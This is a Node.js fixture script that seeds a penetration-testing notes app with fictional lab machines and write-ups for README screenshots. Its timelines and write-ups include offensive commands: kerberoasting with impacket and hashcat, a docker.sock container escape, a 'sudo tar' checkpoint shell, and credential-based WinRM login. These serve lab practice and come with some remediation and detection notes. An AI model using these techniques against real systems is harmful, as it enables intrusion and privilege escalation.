#!/usr/bin/env node
// ============================================================================
// demo-fixture.js — the lived-in database the README screenshots are taken of.
//
// A screenshot of an empty app sells nothing: the Machines dashboard is a blank
// slate, the timeline has no entries and the report tab has nothing to assemble.
// So scripts/screenshots.js imports this fixture first, and photographs a
// workbench that has actually been used.
//
// Nothing here is real. The boxes are fictional, the credentials are invented,
// and the IPs are from the documentation/lab ranges. Sentinel and its graded
// session are NOT re-invented here — they are read straight out of
// examples/oscp-lab.json, the same bundle the test suite regenerates, so the
// screenshots and the importable example can never drift apart.
// ============================================================================
"use strict";
const path = require("path");

const EXAMPLE = require(path.join(__dirname, "..", "examples", "oscp-lab.json"));

// The example's own timeline sits at a fixed date in 2026; the extra boxes are
// dated around it so the dashboard's "recent" ordering looks like one week of
// work rather than five machines touched at the same instant. Everything is then
// re-based onto the moment the screenshots are taken — see rebase() below.
const DAY = 86400000;
const HALF_DAY = DAY / 2;
const HOUR = 3600000;
const T0 = 1773479700000; // Sentinel's first nmap

function iso(ms) { return new Date(ms).toISOString(); }

// ── Four more boxes, so the dashboard and the Kanban board have columns ──
// One per status the board renders (not-started / in-progress / owned /
// reported), because a board where every card sits in one column shows nothing
// about the board.
const EXTRA_MACHINES = [
  {
    id: "m-relay",
    name: "Relay",
    ip: "10.10.11.57",
    os: "Windows Server 2019",
    platform: "HTB",
    difficulty: "hard",
    status: "in-progress",
    tags: ["windows", "active-directory", "kerberos"],
    template: "ad-detailed",
    userFlag: true,
    rootFlag: "",
    startedAt: iso(T0 - 2 * DAY),
    ownedAt: "",
    attackPath:
      "10.10.11.57:445  SMB signing disabled\n" +
      "  └─ guest session -> share listing  (\\\\RELAY\\Backups readable)\n" +
      "       └─ unattend.xml  ->  svc_backup : Backup#2024!\n" +
      "            └─ kerberoast  ->  SPN hash for svc_sql  (cracking)",
    services: [
      { port: "53", proto: "tcp", state: "open", name: "domain", version: "Simple DNS Plus", info: "" },
      { port: "88", proto: "tcp", state: "open", name: "kerberos-sec", version: "Microsoft Windows Kerberos", info: "server time 2026-03-16" },
      { port: "139", proto: "tcp", state: "open", name: "netbios-ssn", version: "Microsoft Windows netbios-ssn", info: "" },
      { port: "389", proto: "tcp", state: "open", name: "ldap", version: "Microsoft Windows Active Directory LDAP", info: "Domain: relay.htb0." },
      { port: "445", proto: "tcp", state: "open", name: "microsoft-ds", version: "Windows Server 2019 Standard 17763", info: "signing disabled" },
      { port: "5985", proto: "tcp", state: "open", name: "http", version: "Microsoft HTTPAPI httpd 2.0", info: "WinRM" },
    ],
    credentials: [
      { username: "svc_backup", secret: "Backup#2024!", type: "password", source: "\\\\RELAY\\Backups\\unattend.xml", works: "smb, winrm", valid: true },
      { username: "svc_sql", secret: "(kerberoast hash — cracking)", type: "hash", source: "GetUserSPNs.py", works: "unknown", valid: false },
    ],
    notes:
      "SMB signing is disabled on the DC, so an NTLM relay is on the table if I can coerce\n" +
      "authentication. Trying the credentialed path first — svc_backup can read the share\n" +
      "and WinRM answers, which is a cheaper route than setting up ntlmrelayx.",
    timeline: [
      { ts: T0 - 2 * DAY, type: "cmd", text: "nmap -sCV -p- --min-rate 2000 -oA relay 10.10.11.57" },
      { ts: T0 - 2 * DAY + 900000, type: "note", text: "Full AD port set. LDAP leaks the domain: relay.htb0. SMB signing disabled — note it for later." },
      { ts: T0 - 2 * DAY + 1500000, type: "cmd", text: "nxc smb 10.10.11.57 -u 'guest' -p '' --shares" },
      { ts: T0 - 2 * DAY + 2400000, type: "note", text: "Guest can read \\\\RELAY\\Backups. unattend.xml has a cleartext password for svc_backup." },
      { ts: T0 - 2 * DAY + 3000000, type: "cmd", text: "nxc winrm 10.10.11.57 -u svc_backup -p 'Backup#2024!'" },
      { ts: T0 - 2 * DAY + 3300000, type: "note", text: "Pwn3d! WinRM shell as svc_backup. user.txt captured." },
      { ts: T0 - 2 * DAY + 4200000, type: "cmd", text: "impacket-GetUserSPNs relay.htb0/svc_backup:'Backup#2024!' -dc-ip 10.10.11.57 -request" },
      { ts: T0 - 2 * DAY + 4500000, type: "note", text: "One SPN: svc_sql. Hash is in hashcat now (-m 13100, rockyou + rules)." },
    ],
    evidence: [],
    createdAt: iso(T0 - 2 * DAY),
    updatedAt: iso(T0 - 2 * DAY + 4500000),
  },
  {
    id: "m-forge",
    name: "Forge",
    ip: "10.10.11.23",
    os: "Linux (Debian 12)",
    platform: "HTB",
    difficulty: "medium",
    status: "owned",
    tags: ["linux", "web", "docker", "ssrf"],
    template: "container-k8s",
    userFlag: true,
    rootFlag: true,
    startedAt: iso(T0 - 6 * DAY),
    ownedAt: iso(T0 - 5 * DAY),
    attackPath:
      "10.10.11.23:80  upload form fetches remote URLs\n" +
      "  └─ SSRF via ?url=  ->  169.254.169.254 metadata reachable\n" +
      "       └─ internal admin vhost  ->  file upload  ->  PHP shell\n" +
      "            └─ container with docker.sock mounted  ->  host root",
    services: [
      { port: "22", proto: "tcp", state: "open", name: "ssh", version: "OpenSSH 9.2p1 Debian 2+deb12u2", info: "" },
      { port: "80", proto: "tcp", state: "open", name: "http", version: "nginx 1.22.1", info: "" },
      { port: "2375", proto: "tcp", state: "filtered", name: "docker", version: "", info: "" },
    ],
    credentials: [
      { username: "www-data", secret: "(webshell — no password)", type: "other", source: "upload form on the admin vhost", works: "container shell", valid: true },
      { username: "root", secret: "(docker.sock -> privileged container)", type: "other", source: "/var/run/docker.sock mounted in the container", works: "host root", valid: true },
    ],
    notes: "The box is a container escape dressed as a web challenge. The SSRF is only there to reach the internal vhost.",
    timeline: [
      { ts: T0 - 6 * DAY, type: "cmd", text: "nmap -sCV -p- --min-rate 2000 -oA forge 10.10.11.23" },
      { ts: T0 - 6 * DAY + 1200000, type: "cmd", text: "ffuf -u http://10.10.11.23/?url=FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0" },
      { ts: T0 - 6 * DAY + 2100000, type: "note", text: "?url= fetches server-side. Classic SSRF — internal admin vhost answers on 127.0.0.1:8080." },
      { ts: T0 - 5 * DAY, type: "cmd", text: "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh" },
      { ts: T0 - 5 * DAY + 60000, type: "note", text: "docker.sock was mounted into the container. Host root, proof.txt captured." },
    ],
    evidence: [],
    createdAt: iso(T0 - 6 * DAY),
    updatedAt: iso(T0 - 5 * DAY + 60000),
  },
  {
    id: "m-beacon",
    name: "Beacon",
    ip: "10.10.11.88",
    os: "Linux (Ubuntu 22.04)",
    platform: "PG Practice",
    difficulty: "easy",
    status: "in-progress",
    tags: ["linux", "web", "cms"],
    template: "web",
    userFlag: "",
    rootFlag: "",
    startedAt: iso(T0 - 1 * DAY),
    ownedAt: "",
    attackPath: "",
    services: [
      { port: "22", proto: "tcp", state: "open", name: "ssh", version: "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6", info: "" },
      { port: "80", proto: "tcp", state: "open", name: "http", version: "Apache httpd 2.4.52", info: "WordPress 6.4.2" },
      { port: "8080", proto: "tcp", state: "open", name: "http-proxy", version: "Jetty 9.4.43", info: "" },
    ],
    credentials: [],
    notes: "WordPress 6.4.2 core is current — go after the plugins, not the core. Jetty on 8080 is probably the real way in.",
    timeline: [
      { ts: T0 - 1 * DAY, type: "cmd", text: "nmap -sCV -p- --min-rate 2000 -oA beacon 10.10.11.88" },
      { ts: T0 - 1 * DAY + 600000, type: "cmd", text: "wpscan --url http://10.10.11.88 --enumerate vp,vt,u --api-token <WPSCAN_TOKEN>" },
      { ts: T0 - 1 * DAY + 1500000, type: "note", text: "Two outdated plugins. Jetty 9.4.43 on 8080 is unauthenticated — checking for the /console path next." },
    ],
    evidence: [],
    createdAt: iso(T0 - 1 * DAY),
    updatedAt: iso(T0 - 1 * DAY + 1500000),
  },
  {
    id: "m-vault",
    name: "Vault",
    ip: "10.10.11.95",
    os: "Windows 11 Enterprise",
    platform: "OSCP",
    difficulty: "hard",
    status: "not-started",
    tags: ["windows", "exam-prep"],
    template: "windows-privesc",
    userFlag: "",
    rootFlag: "",
    startedAt: "",
    ownedAt: "",
    attackPath: "",
    services: [],
    credentials: [],
    notes: "Queued for the weekend. Standalone Windows box — this is the privesc practice I keep putting off.",
    timeline: [],
    evidence: [],
    createdAt: iso(T0 - HALF_DAY),
    updatedAt: iso(T0 - HALF_DAY),
  },
];

// ── Write-ups ──
// Written as the app's own Markdown dialect (tables, task lists, fenced code)
// so the editor screenshot shows the renderer doing real work rather than
// rendering three lines of lorem ipsum.
const WRITEUPS = [
  {
    id: "wu-sentinel",
    title: "Sentinel — /backup, a reused password, and sudo tar",
    tags: ["oscp", "linux", "walkthrough"],
    relatedMachine: (EXAMPLE.machines[0] || {}).id || "",
    createdAt: iso(T0 + 5 * 3600000),
    updatedAt: iso(T0 + 9 * 3600000),
    content: [
      "# Sentinel",
      "",
      "> Linux · medium · rooted in 2h14m. Nothing here needed an exploit — the box",
      "> was three ordinary mistakes stacked on top of each other.",
      "",
      "| | |",
      "|---|---|",
      "| **Target** | 10.10.11.42 |",
      "| **OS** | Ubuntu 20.04 |",
      "| **Initial foothold** | credential reuse (web → SSH) |",
      "| **Privilege escalation** | `sudo tar --checkpoint-action` |",
      "| **CVSS** | 8.8 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |",
      "",
      "## 1. Enumeration",
      "",
      "Two ports and a filtered MySQL. The version banner is current, so the way in was",
      "going to be content, not a CVE.",
      "",
      "```bash",
      "nmap -sCV -p- --min-rate 2000 -oA sentinel 10.10.11.42",
      "```",
      "",
      "```",
      "22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5",
      "80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))",
      "3306/tcp filtered mysql",
      "```",
      "",
      "## 2. The finding",
      "",
      "`/backup/` still had directory listing enabled, and Apache served the `.bak` file",
      "as `text/plain` — so the database password was readable in a browser.",
      "",
      "```bash",
      "curl -s http://10.10.11.42/backup/site-config.php.bak | grep -i pass",
      "```",
      "",
      "That password was reused for the `svc_web` SSH account. **That** is the finding —",
      "the directory listing is only how it was reached.",
      "",
      "## 3. Root",
      "",
      "```bash",
      "sudo -l",
      "# (ALL) NOPASSWD: /usr/bin/tar",
      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
      "```",
      "",
      "## Remediation",
      "",
      "- [x] Remove `/backup/` from the web root; it is not a deployment mechanism",
      "- [x] Rotate `svc_web` and break the reuse between the site and SSH",
      "- [ ] Scope the `sudo` rule to the archive paths the job actually needs",
      "- [ ] Turn off `Indexes` globally in the Apache config, not per-directory",
    ].join("\n"),
  },
  {
    id: "wu-kerberoast",
    title: "Kerberoasting, end to end — SPN to Domain Admin",
    tags: ["active-directory", "kerberos", "methodology"],
    relatedMachine: "m-relay",
    createdAt: iso(T0 - 2 * DAY + 5 * 3600000),
    updatedAt: iso(T0 - 2 * DAY + 7 * 3600000),
    content: [
      "# Kerberoasting, end to end",
      "",
      "The attack is four commands. Everything else is knowing *which* SPN is worth the",
      "GPU time.",
      "",
      "## Request the tickets",
      "",
      "```bash",
      "impacket-GetUserSPNs relay.htb0/svc_backup:'Backup#2024!' -dc-ip 10.10.11.57 -request",
      "```",
      "",
      "## Crack offline",
      "",
      "```bash",
      "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt -r best64.rule",
      "```",
      "",
      "## Which accounts are worth it",
      "",
      "| Signal | Why it matters |",
      "|---|---|",
      "| `pwdLastSet` older than ~2 years | predates the current policy; often a weak, human-chosen password |",
      "| Account is in a privileged group | cracking it ends the engagement rather than extending it |",
      "| SPN is a service the org actually runs | placeholder SPNs are frequently disabled accounts |",
      "",
      "## Detection notes",
      "",
      "This is loud where anyone is looking: **4769** with `0x17` (RC4) encryption on an",
      "account that normally requests AES is the single best signal. Say so in the report —",
      "a finding that explains how it *would* have been caught is worth more than one that",
      "only proves it worked.",
    ].join("\n"),
  },
  {
    id: "wu-methodology",
    title: "Exam day: the order I actually work in",
    tags: ["oscp", "checklist"],
    relatedMachine: "",
    createdAt: iso(T0 - 6 * DAY),
    updatedAt: iso(T0 - 5 * DAY),
    content: [
      "# Exam day",
      "",
      "Written down because at hour 14 I do not make good decisions.",
      "",
      "1. **All boxes get a full port scan before any box gets attention.** The scan runs",
      "   while I work; starting them late is starting them twice.",
      "2. **Screenshot as I go, not at the end.** The proof file and the command in the",
      "   same frame, every time.",
      "3. **A box gets 90 minutes before I rotate.** Rotating is not giving up; staring is.",
      "4. **Points before pride.** Two user flags beat one root I am emotionally invested in.",
      "",
      "- [x] Fill the placeholder bar with the exam IPs before touching anything",
      "- [x] Start the session clock so the report window is on screen",
      "- [ ] Write the report *during* the exam, not after",
    ].join("\n"),
  },
];

// ── Per-category sticky notes ──
// Keyed by category id, which is stable in seed.js.
const NOTES = {};

// ── Re-base every timestamp onto "now" ──
// The fixture's dates are fixed so the story stays coherent, but a session that
// finished in March renders its report window as OVERDUE in red the moment the
// calendar moves past it — which photographs as a broken app rather than a
// working one. Shift the whole bundle by one delta instead: relative gaps are
// preserved, so the same week of work always ends a few hours ago.
//
// Deliberately narrow about what counts as a time: epoch milliseconds (anything
// past the year 2001 in ms) and ISO-8601 strings. Points, ports and ids are
// numbers too, and none of them may move.
const EPOCH_MS_FLOOR = 1e12;
const ISO_RE = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}/;

function collectMax(node, seen) {
  if (node == null) return;
  if (typeof node === "number") { if (node > EPOCH_MS_FLOOR) seen.push(node); return; }
  if (typeof node === "string") { if (ISO_RE.test(node)) seen.push(Date.parse(node)); return; }
  if (typeof node !== "object") return;
  for (const v of Object.values(node)) collectMax(v, seen);
}

function shift(node, delta) {
  if (Array.isArray(node)) return node.map(v => shift(v, delta));
  if (node && typeof node === "object") {
    const out = {};
    for (const [k, v] of Object.entries(node)) out[k] = shift(v, delta);
    return out;
  }
  if (typeof node === "number" && node > EPOCH_MS_FLOOR) return node + delta;
  if (typeof node === "string" && ISO_RE.test(node)) {
    const t = Date.parse(node);
    return isNaN(t) ? node : new Date(t + delta).toISOString();
  }
  return node;
}

// `now` is injectable so a test can assert the shift without racing the clock.
function buildFixture(now) {
  const raw = {
    machines: JSON.parse(JSON.stringify(EXAMPLE.machines || []))
      .concat(JSON.parse(JSON.stringify(EXTRA_MACHINES))),
    writeups: JSON.parse(JSON.stringify(WRITEUPS)),
    exam: JSON.parse(JSON.stringify(EXAMPLE.exam || {})),
    notes: NOTES,
  };
  const seen = [];
  collectMax(raw, seen);
  if (!seen.length) return raw;
  // Land the newest event three hours ago: recent enough that the session's
  // 24-hour report window is still open and counting down on screen.
  const target = (now === undefined ? Date.now() : now) - 3 * HOUR;
  return shift(raw, target - Math.max(...seen));
}

module.exports = { buildFixture, EXTRA_MACHINES, WRITEUPS };

if (require.main === module) {
  process.stdout.write(JSON.stringify(buildFixture(), null, 2) + "\n");
}
